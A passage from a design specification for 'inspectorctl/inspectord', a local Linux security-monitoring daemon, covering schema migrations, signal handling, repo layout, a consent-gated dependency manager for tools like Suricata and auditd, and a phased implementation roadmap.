`inspectorctl self-test` injects synthetic events flagged `event.synthetic=true` into the live pipeline, verifies each appears in the journal and produces the expected alert (mock-routed to `/dev/null` for sinks). Run in install verification and during health-checks.

### 25.6 Performance

* Per-worker microbenchmarks for parser throughput and rule-match latency.
* Soak test: 24-hour run with synthetic load matching a "noisy desktop" profile, asserting memory remains stable and no events are dropped.

---

## §26 — Migrations & versioning

### 26.1 Versioned surfaces

* `Event` schema (`schema_version`).
* `Alert`, `Incident`, `Allowlist`, `Case` schemas.
* DuckDB schema (single `schema_version` table, integer counter).
* Rule YAML format version.
* Sigma format version (tracked but managed by pySigma).
* Python plugin API version (declared at top of each plugin).
* IPC protocol version (per-request `schema_version`).
* Config file versions (each file has its own).
* Notification payload versions.
* Manifest format for the forensic store.

### 26.2 Migration flow on daemon start

1. Read `schema_version` from DuckDB.
2. If older than code expects, run ordered migration scripts in `inspectord/migrations/db/`.
3. For each config file, run `inspectord/migrations/config/` migrations as needed.
4. For event journal entries: parsers tolerate older `schema_version`; the journal is read-only at this layer (we never rewrite).
5. If a worker's emitted `schema_version` exceeds current code support, the daemon refuses to start and writes a clear error.

### 26.3 Spec versioning rule

Every change to this document bumps the spec version and adds a changelog row. Changes that break a declared interface (event schema, IPC method signature, rule YAML format, etc.) bump the MAJOR component.

---

## §27 — Operational concerns

### 27.1 Signals

| Signal | Effect |
| --- | --- |
| `SIGHUP` | Reload configs; propagate to workers; rollback on validation failure. |
| `SIGTERM` | Graceful shutdown: stop accepting new events; drain queues; flush DuckDB; sync journal; close sockets; exit. Within `KillTimeoutSec` (default 60 s). |
| `SIGUSR1` | Dump diagnostics (worker states, queue depths, in-flight events, recent errors) to `/run/inspectord/diag-<ts>.json`. |
| `SIGUSR2` | Trigger `self_test`. |

### 27.2 Suspend / hibernate

* Daemon registers for `PrepareForSleep` / `PrepareForShutdown` via systemd-logind D-Bus.
* On suspend: pauses heavy collectors (`process_collector`, `nids_bridge`), flushes journal, snapshots clock.
* On resume: re-reads clock and compares with the pre-suspend snapshot + an external clock source if NTP sync is healthy. Large unexplained jumps emit `clock_skew_suspicious` events (a classic anti-forensic move).

### 27.3 Crash recovery

* On startup, reconcile: replay journal tail not yet committed to DuckDB; finalize partial DuckDB transactions (via DuckDB WAL); clean up worker debris (kill orphaned worker PIDs from previous run).

### 27.4 Boot impact

* `inspectord.service`: `After=network-online.target`, `Wants=network-online.target`. Critical workers (`log_tailer`, `fim_watcher`, `process_collector`, `services_monitor`) start in parallel.
* Heavy workers (`nids_bridge`, `vuln_scanner`, `hardening_auditor`) defer start by 60 s to avoid impacting boot time.
* Target: daemon ready (`READY=1` notify) within 5 s; full worker complement up within 90 s.

### 27.5 Self-baseline

`anomaly_detector` includes inspectord's own CPU/RAM as a tracked entity (§20.6). Self-anomaly alerts use a separate rule class to avoid feedback loops.

---

## §28 — Project layout & build

### 28.1 Repo layout

```
inspectord/
├── pyproject.toml                       # Python project (poetry / hatch)
├── Cargo.toml                           # workspace for Rust crates
├── docs/
│   └── superpowers/
│       └── specs/
│           └── 2026-05-24-local-inspection-design.md   ← this file
├── packaging/
│   ├── systemd/
│   │   ├── inspectord.service
│   │   ├── inspectord-watchdog.service
│   │   └── inspectorctl-tray.service
│   ├── apparmor/
│   │   └── inspectord
│   ├── polkit/
│   │   └── org.inspectord.policy
│   ├── arch/
│   │   └── PKGBUILD
│   └── completions/
│       ├── bash/
│       └── zsh/
├── inspectord/                          # Python package: the daemon
│   ├── __init__.py
│   ├── supervisor.py
│   ├── router.py
│   ├── workers/
│   │   ├── log_tailer/
│   │   ├── process_collector/          # Python wrapper + Rust hot-path
│   │   ├── fim_watcher/
│   │   ├── nids_bridge/
│   │   ├── scanner_runner/
│   │   ├── package_monitor/
│   │   ├── udev_monitor/
│   │   ├── listening_socket_snapshotter/
│   │   ├── outbound_connection_tracker/  # Python wrapper + Rust eBPF
│   │   ├── kmod_watcher/
│   │   ├── services_monitor/
│   │   ├── firewall_inspector/
│   │   ├── enrichment_worker/
│   │   ├── intel_updater/
│   │   ├── rule_engine/
│   │   ├── anomaly_detector/
│   │   ├── evidence_collector/
│   │   ├── vuln_scanner/
│   │   ├── drift_detector/
│   │   ├── hardening_auditor/
│   │   ├── notifier/
│   │   └── ipc_server/
│   ├── parsers/
│   ├── enrichment/
│   ├── renderers/
│   ├── schemas/
│   ├── rules/starter/
│   ├── migrations/
│   ├── storage/                         # DuckDB + journal wrappers
│   └── plugins/                         # Python rule plugin API
├── inspectorctl/                        # user-mode CLI + tray + web UI
│   ├── cli/
│   ├── tray/
│   ├── web/
│   │   ├── app.py
│   │   ├── templates/
│   │   └── static/
│   └── ipc_client/
├── crates/                              # Rust hot-path code
│   ├── ebpf-process/                    # eBPF programs + loader
│   ├── ebpf-net/
│   └── parser-fast/                     # high-volume parsers in Rust if needed
└── tests/
    ├── parsers/
    ├── rules/
    ├── integration/
    └── perf/
```

### 28.2 Language split

* **Python (~80 %)** — supervisor, router, parsers, rule engine, anomaly detector, IPC, UI, CLI.
* **Rust (~20 %)** — eBPF probe programs and their loaders (`aya` or `libbpf-rs`), any parser where Python throughput is insufficient (likely the `nids_bridge` EVE consumer at high traffic).
* **Jinja2** — renderers, web templates.

### 28.3 Build

* `pyproject.toml` with `hatch` build backend; Rust crates built via `maturin` and exposed as Python extension modules where needed.
* `make` targets for `build`, `test`, `lint`, `package-arch`, `install-local`.

---

## §29 — Installation & uninstall

### 29.1 Methods

1. **AUR package** (`inspectord-bin` or `inspectord-git`) — primary on Arch/CachyOS; pulls dependencies (Suricata, ClamAV, rkhunter, AIDE, yara, auditd) as `depends` or `optdepends`.
2. **Source install** — `make install` runs the same logic for distros without an AUR package.
3. **Wheels** for Python components published to PyPI for partial install on non-Arch distros (functionality dependent on whether system tools are present).

### 29.2 Post-install

* Creates `inspectord` system user/group and `inspectord-clients` group.
* Installs systemd units, AppArmor profile, polkit policy.
* Does NOT enable services; requires user to run `inspectorctl setup` (the first-run wizard).

### 29.3 Uninstall

* `inspectorctl uninstall --keep-data` (default) — removes binaries and unit files; preserves `/var/lib/inspectord/` (baselines, cases, evidence, journal) for forensic purposes.
* `inspectorctl uninstall --purge` — removes everything including data. Confirms twice.

---

## §30 — Dependency management

### 30.1 Purpose

`inspectord` wraps a number of best-of-breed external tools (auditd, Suricata, ClamAV, rkhunter, AIDE, YARA, GeoIP DB, and several Python/Rust libraries). Most users do not have these installed, do not have time to read each tool's documentation, and would never set this up if it required manual work across 8+ packages.

The **dependency_manager** subsystem makes the central monitor self-bootstrapping: on first run (and continuously thereafter) it determines what is needed, what is missing, asks the user for consent, installs packages via the system package manager, applies our own sidecar configuration so the tool emits what we need, verifies the tool end-to-end, and continues to monitor it for health.

### 30.2 Core principles

| # | Principle | Mechanism |
| --- | --- | --- |
| 1 | **Never silent installs.** | All install operations require explicit user confirmation through polkit + a reviewed plan. The CLI requires `--yes` or `--from-plan <id>`. |
| 2 | **Hardcoded dependency manifest.** | The set of installable packages is a static manifest in the codebase (`inspectord/dependencies/manifest/`). The subsystem cannot install arbitrary packages from data. |
| 3 | **Sidecar configuration only.** | We never edit upstream config files. We only drop our own files into the tool's include/drop-in directory. Uninstall = deleting our drop-in. |
| 4 | **Backup before any modification.** | If a fallback path requires editing an existing file, the original is copied to `/var/lib/inspectord/dep_config_backups/<tool>/<original_path>.bak.<timestamp>` first and a backup row is written to the `dep_config_backups` table. |
| 5 | **Plan-then-execute.** | `plan_dependency_install` produces a typed plan that the UI/CLI renders. `apply_dependency_plan` executes that exact plan and nothing else. |
| 6 | **Cross-distro.** | Distro-detection picks one of the supported package-manager backends; the dependency manifest declares per-distro package names. |
| 7 | **Continuous health.** | The worker periodically re-verifies that each dependency is installed, the service is running (if applicable), our drop-in is intact, and the tool is producing the expected output. Failures emit health events surfaced in the Dependencies and Health panels. |
| 8 | **Reversibility.** | Every action records to the audit log. Restoring a backed-up config and removing our drop-in are first-class operations. Uninstalling inspectord leaves third-party packages installed (they may be useful standalone) but offers to remove our drop-ins. |
| 9 | **Refuse on contention.** | If the package manager reports a lock file (`/var/lib/pacman/db.lck`, `/var/lib/dpkg/lock`, etc.) we refuse to act and surface a clear error. |
| 10 | **Optional vs required is profile-driven.** | A dep that is *required* under the selected profile blocks bootstrap if missing; an *optional* dep can be skipped. |

### 30.3 Dependency manifest format (`v1.0.0`)

Each dependency is a YAML file under `inspectord/dependencies/manifest/<name>.yaml`:

```yaml
version: 1.0.0
name: suricata
description: "Network IDS — provides packet inspection and EVE JSON output that nids_bridge consumes."
required_when:
  profiles:        [standard]
  flags:           [nids.enabled]
optional_when:
  profiles:        [minimal]
distro_packages:
  arch:            [suricata]
  cachyos:         [suricata]
  debian:          [suricata]
  ubuntu:          [suricata]
  fedora:          [suricata]
  opensuse:        [suricata]
minimum_version:   "7.0.0"
service:
  systemd_unit:    suricata.service
  enable:          true
  start:           true
config:
  strategy:        sidecar           # sidecar | edit-with-backup
  include_dir:     /etc/suricata/include.d/
  dropin:
    filename:      inspectord.yaml
    template:      templates/suricata/inspectord.yaml.j2
    owner:         root
    mode:          "0644"
  validate_cmd:    ["suricata", "-T", "-c", "/etc/suricata/suricata.yaml"]
permissions:
  add_group_membership:
    - user:        inspectord
      group:       adm        # so inspectord can read /var/log/suricata/eve.json
  ensure_readable:
    - path:        /var/log/suricata/eve.json
      who:         inspectord
verify:
  binary_paths:    [/usr/bin/suricata, /usr/sbin/suricata]
  version_cmd:     ["suricata", "--version"]
  version_regex:   "version (\\d+\\.\\d+\\.\\d+)"
  health_probe:
    kind:          file_exists_and_growing
    path:          /var/log/suricata/eve.json
    grow_window_s: 60
post_install_hooks:
  - command:       ["suricata-update"]
    optional:      true
rollback:
  remove_dropin:   true
  reload_service:  true
  remove_group_membership: false       # leave inspectord in `adm`; harmless
```

### 30.4 Distro detection & package-manager backends

* **Detection**: read `/etc/os-release` `ID` and `ID_LIKE`. Map to one of `arch`, `debian`, `fedora`, `opensuse`. CachyOS, Manjaro, EndeavourOS → `arch`. Ubuntu, Linux Mint → `debian`. Rocky, AlmaLinux → `fedora`. openSUSE Tumbleweed/Leap → `opensuse`.
* **Backends**: `PacmanBackend`, `AptBackend`, `DnfBackend`, `ZypperBackend`. Each implements:

```python
class PackageBackend(Protocol):
    schema_version: str = "1.0.0"
    def is_installed(self, pkg: str) -> bool: ...
    def installed_version(self, pkg: str) -> str | None: ...
    def candidate_version(self, pkg: str) -> str | None: ...
    def install(self, pkgs: list[str], *, dry_run: bool=False) -> InstallResult: ...
    def remove(self, pkgs: list[str], *, dry_run: bool=False) -> RemoveResult: ...
    def is_locked(self) -> bool: ...     # check db lock files
    def refresh_metadata(self) -> None: ...  # pacman -Sy / apt update
```

* The backend itself is **not** root. The privileged `install` / `remove` call is issued through polkit to a small, audited wrapper (`/usr/libexec/inspectord/pkg-helper`) that accepts only an opaque pre-signed plan token referencing a row in `pending_dep_plans`. The helper validates the plan, calls the package manager with **explicit `--noconfirm` and a fixed package set drawn from the plan only**, and returns structured output.

### 30.5 Plan data type

```jsonc
{
  "schema_version": "1.0.0",
  "plan_id": "uuid-v7",
  "created_at": "...",
  "created_by": "eli@local",
  "distro": "arch",
  "package_manager": "pacman",
  "items": [
    {
      "name": "suricata",
      "action": "install",
      "packages": ["suricata"],
      "expected_command": "pacman -S --noconfirm --needed suricata",
      "config_dropin": "/etc/suricata/include.d/inspectord.yaml",
      "service_actions": ["systemctl enable --now suricata.service"],
      "permission_actions": ["gpasswd -a inspectord adm"],
      "post_install_hooks": ["suricata-update"]
    },
    {
      "name": "rkhunter",
      "action": "install",
      "packages": ["rkhunter"],
      "expected_command": "pacman -S --noconfirm --needed rkhunter",
      "config_dropin": "/etc/rkhunter.conf.d/inspectord.conf",
      "post_install_hooks": ["rkhunter --propupd"]
    }
  ],
  "estimated_disk_mb": 240,
  "expires_at": "<plan_id created_at + 1 h>"
}
```

Plans expire after one hour so a stale plan cannot be applied against a moved-on system.

### 30.6 Sidecar-config templates

Sidecar configuration templates live in `inspectord/dependencies/templates/<tool>/`. Each template is a Jinja2 file producing the final drop-in. Variables include paths under `/var/log/...`, `inspectord` user/group, profile-dependent settings (e.g., Suricata interface list).

Indicative drop-ins (illustrative — final wording lives in the templates):

| Tool | Drop-in location | What we configure |
| --- | --- | --- |
| Suricata | `/etc/suricata/include.d/inspectord.yaml` | Enable EVE JSON output to `/var/log/suricata/eve.json` with the event types we need. |
| auditd | `/etc/audit/rules.d/inspectord.rules` | Audit rules for `execve`, `connect`, `ptrace`, `finit_module`, `setuid` changes (whatever isn't covered by eBPF). |
| systemd-journald | `/etc/systemd/journald.conf.d/inspectord.conf` | Ensure persistent storage (`Storage=persistent`). |
| rsyslog (optional) | `/etc/rsyslog.d/30-inspectord.conf` | Tap `auth.*` to a dedicated file we tail (only when journald not used as the source). |
| rkhunter | `/etc/rkhunter.conf.d/inspectord.conf` | Whitelist tuning + a log location we read. |
| AIDE | (no system config drop-in; we own its database under `/var/lib/inspectord/aide/`) | We invoke aide with our own config file we ship. |
| ClamAV | `/etc/clamav/clamd.d/inspectord.conf`, `/etc/clamav/freshclam.d/inspectord.conf` | Schedule + paths. |
| YARA | (no system config) | We ship rulesets under `/var/lib/inspectord/yara/`. |
| MaxMind GeoLite2 | (no system config) | Download to `/var/lib/inspectord/geoip/` on user command. |
| nftables (optional) | `/etc/nftables.d/inspectord.nft` (only when user enables the optional "log denied" feature) | Adds a `log prefix "inspectord:"` line to a chain. Off by default. |

If a tool does *not* support an include directory and we genuinely must edit its primary config, the strategy switches to `edit-with-backup`:

1. Snapshot the original to `/var/lib/inspectord/dep_config_backups/<tool>/<path>.<timestamp>.bak` (plus DuckDB row).
2. Apply a *minimal*, *bounded*, *idempotent* edit between marker comments `# >>> inspectord BEGIN` … `# <<< inspectord END`.
3. Validate via the tool's own config check (`validate_cmd`).
4. On any failure → restore from backup.

### 30.7 Verification

After install + config, the worker runs a `health_probe` per dependency. Probe kinds in v1:

| Kind | Semantics |
| --- | --- |
| `binary_exists_and_runs` | `which`-equivalent + `--version` |
| `service_active` | `systemctl is-active <unit>` |
| `file_exists` | path is present |
| `file_exists_and_growing` | path is present and its mtime advances within `grow_window_s` (proves the tool is actually emitting) |
| `command_exit_zero` | runs an arbitrary read-only command from the manifest |
| `journal_pattern_recent` | a regex match appears in journald within a window |

The verify result is stored on the dependency row and surfaced in the UI; failures emit `dep_misconfigured` events.

### 30.8 Runtime monitoring

`dependency_manager` re-verifies every dependency on a configurable cadence (default: lightweight checks every 5 minutes, full re-verify daily). Detected regressions:

* Package removed → `dep_missing` (high).
* Service not running → `dep_service_down` (high).
* Our drop-in modified externally → `dep_dropin_tampered` (high — note the security implication).
* Drop-in deleted externally → `dep_dropin_missing` (high).
* Tool stopped emitting expected output → `dep_silent` (high).
* Tool version dropped below `minimum_version` → `dep_outdated` (medium).

### 30.9 UI flow (Settings → Dependencies)

1. **Status table** lists every declared dependency with: name, required-by-profile, installed (Y/N), version, drop-in present (Y/N), last verify result, last verify time, "View backup history".
2. **Install plan** button gathers everything missing/outdated and produces a plan (§30.5). The user sees the proposed packages, exact commands, and disk estimate before approving.
3. **Per-row actions**: Install / Re-install, Configure (drop-in), Verify now, View audit, Restore prior backup, Remove drop-in.
4. **No "uninstall package" action.** Removing third-party packages is the user's call via their normal package manager. Removing our drop-in is fine — that's reversible.

### 30.10 Audit log

Every dep_manager action writes an `audit_log` row with: actor, action (`plan_created`, `plan_applied`, `dropin_written`, `dropin_modified`, `dropin_removed`, `service_enabled`, `service_started`, `group_added`, `backup_created`, `backup_restored`, `verify_pass`, `verify_fail`), target dep, before/after fingerprint (sha256 of any file written), plan id (if applicable), command executed, exit code, stderr tail.

### 30.11 Failure modes

| Failure | Behaviour |
| --- | --- |
| Package manager lock present | Refuse to act; surface error; suggest the user retry after their own update finishes. |
| Network failure during install | Package manager handles; we surface its error verbatim; partial-state recovery: any dropin already written is left in place and marked `pending_verify`. |
| Sidecar template renders to invalid config | Validate via `validate_cmd` before writing; abort and leave system untouched. |
| Service refuses to start with new config | Roll back the drop-in (restore from backup or delete), restart service, surface error. |
| User declines the polkit prompt | Plan stays in `pending_dep_plans`; nothing executes. |
| Verify fails after a successful install | `dep_misconfigured` event; user is shown a remediation suggestion (reconfigure, check logs, manual intervention pointer). |
| Helper binary signature mismatch | The pkg-helper validates that its caller is `inspectord` and that the plan token matches a row in `pending_dep_plans` it has read access to. Mismatch → exit 1, alert. |

### 30.12 Security model for the helper

* `/usr/libexec/inspectord/pkg-helper` ships with the package, owned `root:root`, mode `0755`.
* It is the **only** binary allowed by polkit to invoke `pacman`/`apt`/`dnf`/`zypper` on behalf of `inspectord`.
* It accepts a single argument: a plan id. It reads `pending_dep_plans` (table is also readable by it via group), validates that:
  * the plan is not expired,
  * the plan's `expected_command`'s packages are all present in the static manifest under one of the recognized dependency names,
  * the package manager invocation matches one of a small set of accepted templates.
* It writes its stdout/stderr to the audit log.
* It never accepts package names from the CLI, environment, or any source other than the validated plan.

### 30.13 Profile interaction recap

| Profile | Required deps | Optional (asked) |
| --- | --- | --- |
| `minimal` | auditd, journald (persistent), AIDE (we own its DB), YARA (bundled rules), libudev (system lib). | rkhunter, ClamAV, MaxMind GeoLite2, nftables logging dropin. |
| `standard` | All of `minimal` + (if NIDS flag on) Suricata, eBPF kernel features (verified, not installed). | ClamAV, MaxMind GeoLite2, nftables logging dropin. |

### 30.14 Versioning

* Manifest format: `version: 1.0.0` per file; loader validates.
* Helper binary protocol: `protocol_version: "1.0.0"` in the plan; helper refuses unknown versions.
* Backup directory structure & DuckDB tables: declared `schema_version`.

---

## §31 — Phased implementation roadmap

The design is one product, but it ships in milestones so there's always a working artifact.

### Phase 0 — Skeleton (week-scale)

* Project scaffolding (Python + Rust workspace, packaging stubs).
* Supervisor + Router + Journal + DuckDB schema + minimal IPC.
* Healthcheck-only worker that emits synthetic events.
* Tray app shows the supervisor's status (no alerts yet).
* `inspectorctl status`, `inspectorctl self-test`.

### Phase 1 — First useful slice + dependency manager

* `dependency_manager` (§30) with PacmanBackend (target distro first); manifest entries for `auditd`, `journald` persistent storage, `AIDE`, `YARA`. Plan/install/configure/verify path complete; `inspectorctl deps ...` CLI usable.
* First-run wizard integrates step 0.
* `log_tailer` (journald + auth + pacman) + parsers.
* `fim_watcher` for a hardcoded path set.
* Enrichment (process + file hash).
* Rule engine (Sigma + YAML) with starter pack subset (LOLBin + persistence + new-SUID + sshd brute-force).
* Allowlist (file-based; UI later).
* Notifier with Desktop popup only.
* Web dashboard: Alerts + Live Events + Health + Dependencies.
* **Outcome**: from a clean machine, the user runs `inspectorctl setup`, approves the install plan, and ends up with a working monitor — no manual tool installation.

### Phase 2 — Behavioral & state coverage

* `process_collector` (eBPF) + outbound tracker + kmod watcher.
* `services_monitor`, `udev_monitor`, `firewall_inspector`, `listening_socket_snapshotter`.
* `anomaly_detector` (statistical + first-sighting).
* `evidence_collector` + Cases.
* Entity context cards.
* Dashboard panels: Processes, Network, Services, Devices, Persistence, File Integrity, Cases.
* `dependency_manager`: add eBPF feature verification (no install — kernel features), optional `rkhunter` manifest entry.

### Phase 3 — Scanners & vuln awareness

* `scanner_runner` (rkhunter, AIDE, YARA) + parsers + scheduling.
* `vuln_scanner` + Vulnerabilities panel.
* Quarantine.
* Hunt panel.
* `dependency_manager`: ClamAV manifest entry (optional), GeoLite2 downloader.

### Phase 4 — NIDS, intel, hardening, cross-distro

* `nids_bridge` (Suricata) + Suricata manifest entry.
* `intel_updater` + threat intel enrichment.
* `drift_detector`, `hardening_auditor`.
* Telegram + Signal notifier backends.
* Pending Actions (full menu).
* Reports.
* `dependency_manager`: add AptBackend, DnfBackend, ZypperBackend with distro-package mappings.

### Phase 5 — Polish & resilience

* Backup/restore, suspend/resume handling, rule-pack updater, learning-mode promotion UX.
* `dependency_manager`: continuous runtime monitoring fully polished; tamper detection on our drop-ins.
* Performance soak + tuning.
* AUR packaging final pass + documentation; equivalent packaging for Debian/Fedora/openSUSE.

### Notes

* Each phase ships independently usable; the user can adopt and benefit incrementally.
* Profiles (`minimal`, `standard`) are defined from Phase 1 onward; some workers come online in later phases inside the `standard` profile.

---

## §32 — Explicit non-goals & deferred items

(Repeating from §0.2 for visibility and reference.)

* No multi-host server / agent-collector split.
* No automatic active response without user confirmation.
* **No LLM integration of any kind. No MCP server. No cloud AI.**
* No telemetry / phone-home / analytics.
* No browser-extension monitoring.
* No container/Docker awareness.
* No DNS-over-HTTPS evasion detection.
* No memory forensics.
* No graph view of entities (context cards cover the need).
* No threat-hunting playbooks shipped (community can contribute later).
* No Windows / macOS.
* English only.

---

## Appendix A — Glossary

| Term | Definition |
| --- | --- |
| **Alert** | A `rule_engine` or `anomaly_detector` finding requiring triage. |
| **Incident** | A group of related alerts sharing entities + time-window. |
| **Case** | A user-curated bundle of alerts/incidents/entities/evidence for forensic record. |
| **Pending action** | A proposed mitigation awaiting user confirmation. |
| **Allowlist** | A scoped exception that suppresses future matches. |
| **Baseline** | A snapshot of known-good state for FIM, services, listeners, etc. |
| **First sighting** | The first time a `(category, entity)` pair is observed; tracked for novelty alerts. |
| **Profile** | An install-time bundle (`minimal`, `standard`) defining which workers and budgets apply. |
| **Entity** | A first-class subject (process, IP, hash, file, user, port, etc.) the UI pivots on. |

---

## Appendix B — Quick-reference: the 24 workers

`log_tailer`, `process_collector`, `fim_watcher`, `nids_bridge`, `scanner_runner`, `package_monitor`, `udev_monitor`, `listening_socket_snapshotter`, `outbound_connection_tracker`, `kmod_watcher`, `services_monitor`, `firewall_inspector`, `enrichment_worker`, `intel_updater`, `rule_engine`, `anomaly_detector`, `evidence_collector`, `vuln_scanner`, `drift_detector`, `hardening_auditor`, `notifier`, `ipc_server`, `dependency_manager`, `watchdog`.

---

*End of spec v0.2.0.*
